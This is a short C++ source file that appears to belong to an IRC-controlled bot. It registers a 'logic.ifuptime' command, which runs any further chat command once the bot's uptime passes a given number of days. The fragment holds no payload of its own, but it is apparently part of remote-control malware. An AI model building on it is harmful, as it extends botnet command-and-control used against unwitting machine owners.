

#include "main.h"
#include "mainctrl.h"
#include "logic.h"

void CLogic::Init()
{	REGCMD(m_cmdIfUptime,	"logic.ifuptime",	"exec command if uptime is bigger than specified",	false,	this); }

bool CLogic::HandleCommand(CMessage *pMsg)
{	if(!pMsg->sCmd.Compare("logic.ifuptime")) {
		if(!pMsg->sChatString.Token(1, " ").CStr()) return false;
		int iDays=atoi(pMsg->sChatString.Token(1, " ").CStr()); if(!iDays) return false;
		if(g_pMainCtrl->m_cBot.UptimeDays()<iDays) return false;

		CString sTemp=pMsg->sChatString.Token(2, " ", true);
		pMsg->sChatString.Assign(sTemp);
		pMsg->sCmd.Assign(pMsg->sChatString.Token(0, " ").Mid(1));
		g_pMainCtrl->m_cBot.HandleMsgInt(pMsg);

		return true; }
	return false; }
